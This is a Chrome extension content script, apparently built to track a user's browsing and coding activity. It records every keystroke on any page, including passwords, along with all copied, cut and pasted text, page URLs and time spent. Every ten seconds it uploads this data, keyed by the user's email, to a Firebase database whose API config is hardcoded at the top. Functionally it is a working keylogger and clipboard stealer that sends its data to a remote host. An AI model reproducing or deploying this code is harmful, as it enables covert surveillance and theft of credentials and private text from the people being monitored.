/**
 * config variable info to initialize Firebase.
 */
var config = {
  apiKey: "AIzaSyDp8BOChOi_zaguCrDg8D_YP1NLHAlA_V0",
  authDomain: "test-be1cc.firebaseapp.com",
  databaseURL: "https://test-be1cc.firebaseio.com",
  projectId: "test-be1cc",
  storageBucket: "gs://test-be1cc.appspot.com",
  messagingSenderId: "1047082222814",
  appId: "1:1047082222814:web:4c0a9ff088bacca55eee4f",
  measurementId: "G-0392Q4KEVX"
};

/**
* Initializing Firebase
*/
firebase.initializeApp(config);


toBeUpdated = false; //status variable
var clipboardText = ""; //clipboard data variable
var bufferData = {}; //Buffered data that is yet to be uploaded to Firebase.
var userEmail = "default"; //userEmail
var keycount = 0; //Keydown count

/**
* Sending message to background script to get the user variable.
*/
chrome.extension.sendRequest({
  message: "letsgo"
});
chrome.runtime.onMessage.addListener(
  function(request, sender) {
      userEmail = request.message;
  });

/**
* function to push data to Firebase Database.
* @param {data Yet to be updated} bufferData 
*/
function writeUserData(bufferData) {
  userid = userEmail.split("@")[0];
  userid = userid.replace(/[&\/\\#,+()$~%.'":*?<>{}]/g, '_');
  firebase.database().ref('users/').child(userid).child('keystroke').update(bufferData);
  toBeUpdated = false;
}

prev = ""
/**
* To keep track of the keystrokes.
* Included SHIFT, CTRL, CAPSLOCK, ALT etc.
* 
* At the same time adds the info of keycount,
* url, activity type, clipboard data to the Buffered data. 
*/
document.addEventListener("keydown", function(event) {
  if((event.key === "Control" || event.key === "Shift" || event.key === "Alt" ||
   event.key === "Backspace" || event.key === "Capslock" || event.key === "End" || event.key === "PageDown" ||
   event.key === "ArrowDown" || event.key === "ArrowUp" ||event.key === "ArrowLeft" || event.key === "ArrowRight" ||
   event.key === "Enter" ||event.key === "Home" ||event.key === "PageUp" ||event.key === "Insert" || event.key === "Escape" )
    && event.key === prev) {
     console.log("repetitive")
   } else {
    keycount = keycount + 1;
    prev = event.key;
    console.log(event.key, keycount);
    toBeUpdated = true;
    let hostname = getUrl();
    let activity = checkActivity(hostname);
    let epochTime = (new Date).getTime();
    bufferData[epochTime] = {
        "key": event.key,
        "keyCount": keycount,
        "url": hostname,
        "activity": activity,
        "clipboard": clipboardText
    };
   }
  

});

/**
* function to get the url information from working tab.
*/
function getUrl() {
  let url = window.location.href;
  return url;
}

/**
* checks the activity and return the type of activity.
* Yet to develop.
* Idea is to implement as a cloud function.
* @param {url host name} hostname 
*/
function checkActivity(hostname) {
  let qnahostnames = ["www.quora.com", "stackoverflow.com", "www.reddit.com", "meta.stackoverflow.com", "www.codeproject.com", "groups.google.com", "programmersheaven.com"];
  let codehostnames = ["colab.research.google.com"];
  let videohostnames = ["www.youtube.com"];

  if (qnahostnames.includes(hostname))
      return "Q&A";
  else if (codehostnames.includes(hostname))
      return "code";
  else if (videohostnames.includes(hostname))
      return "video";
  else
      return "search";

}

/**
* timer for pushing data to the Firebase.
* At present it pushes data once at 10 seconds
*/
setInterval(function() {
  if (toBeUpdated) {
      toBeUpdated = false;
      writeUserData(bufferData);
      bufferData = {};
      // clipboardText = "";
  }
}, 10000);

/**
* get selected text.
* used in implementation of copying clipboard data
*/
function geSelectionText() {
  let selectedText = "";
  if (window.getSelection) {
      selectedText = window.getSelection().toString();
  }
  return selectedText;
}

/**
* Event listener for copy to Clipboard
*/
document.addEventListener('copy', function() {
  let text = geSelectionText();
  if (text.length > 0) {
    clipboardText = text;
    console.log("Copied text", text);
    toBeUpdated = true;
    let hostname = getUrl();
    let activity = checkActivity(hostname);
    let epochTime = (new Date).getTime();
    bufferData[epochTime] = {
        "key": "",
        "keyCount": "",
        "url": hostname,
        "activity": activity,
        "clipboard": {"Copy": clipboardText}
    };
    clipboardText = ""
  }
}, false)

/**
* Event listener for cut to clipboard
*/
document.addEventListener('cut', function() {
  let text = geSelectionText();
  if (text.length > 0) {
      clipboardText = text;
      // console.log("This is cut text", text);
      toBeUpdated = true;
      let hostname = getUrl();
      let activity = checkActivity(hostname);
      let epochTime = (new Date).getTime();
      bufferData[epochTime] = {
          "key": "",
          "keyCount": "",
          "url": hostname,
          "activity": activity,
          "clipboard": {"Cut": clipboardText}
      };
      clipboardText = ""
  }
}, false)

/**
* Event listener for paste from clipboard.
*/
document.addEventListener('paste', function(e) {
  let data = e.clipboardData.getData('Text');
  clipboardText = data;
  toBeUpdated = true;
    let hostname = getUrl();
    let activity = checkActivity(hostname);
    let epochTime = (new Date).getTime();
    bufferData[epochTime] = {
        "key": "",
        "keyCount": "",
        "url": hostname,
        "activity": activity,
        "clipboard": {"Paste" : clipboardText}
    };
    clipboardText = ""
});





var timeoutID;
var userActive = false;
var TotalTimeSpent = new Date().getTime() - new Date().getTime();
var currentTime = new Date().getTime();
var startTime;
function setup() {
    this.addEventListener('mousemove', resetTimer, false);
    this.addEventListener('mousedown', resetTimer, false);
    this.addEventListener('keypress', resetTimer, false);
    this.addEventListener('scroll', resetTimer, false);
    this.addEventListener('wheel', resetTimer, false);
    this.addEventListener('touchmove', resetTimer, false);
    this.addEventListener('pointermove', resetTimer, false);
    startTimer();
}

setup();

function startTimer() {
    timeoutID = window.setTimeout(goInactive, 5000);
    // console.log("start timer" + timeoutID);
}

function resetTimer(e) {
  // console.log("reset TImer");
  window.clearTimeout(timeoutID);
  goActive();
}
// while(!userActive) {
//   currentTime = new Date().getTime();

setInterval(function() {
  if(!userActive) {
    currentTime = new Date().getTime();
  }
}, 1000)
// }
function printTime(time) {
  var days = Math.floor(time / (1000 * 60 * 60 * 24));
  var hours = Math.floor((time % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((time % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((time % (1000 * 60)) / 1000);
  Stringtime = days + "d " + hours + "h " + minutes + "m " + seconds + "s ";
  console.log(Stringtime);
  return Stringtime;
}


function goInactive() {
    TotalTimeSpent = TotalTimeSpent + (new Date().getTime() - currentTime);
    printTime(TotalTimeSpent);
    console.log("Go inactive");
    // chrome.runtime.sendMessage({ userActive: false });
    userActive = false;
}

function goActive() {
    console.log("GO active")
    // chrome.runtime.sendMessage({ userActive: true });
    userActive = true;
    startTimer();
}


window.onload = function() {
  this.startTime = new this.Date().getTime();
  this.currentTime = new this.Date().getTime();
}

// key = "test"
// value= 123
// chrome.storage.sync.set({key: value}, function() {
//   console.log('Value is set to ' + value);
// });

// chrome.storage.sync.get(['key'], function(result) {
//   console.log('Value currently is ' + result.key);
// });

window.onbeforeunload = function() {
  this.uploadTime();
  return "Confirm";
};



function uploadTime(){
  userid = userEmail.split("@")[0];
  userid = userid.replace(/[&\/\\#,+()$~%.'":*?<>{}]/g, '_');
  let url = getUrl();
  var timeSpent = { }
  timeSpent[(new Date).getTime()] = {
    "url":url,
    "active Time": printTime(TotalTimeSpent),
    "Total Time" : printTime(new Date().getTime() - startTime)
  };

  console.log(userid, timeSpent);
  firebase.database().ref('users/').child(userid).child("DwellTime").update(timeSpent);
  return timeSpent;
}



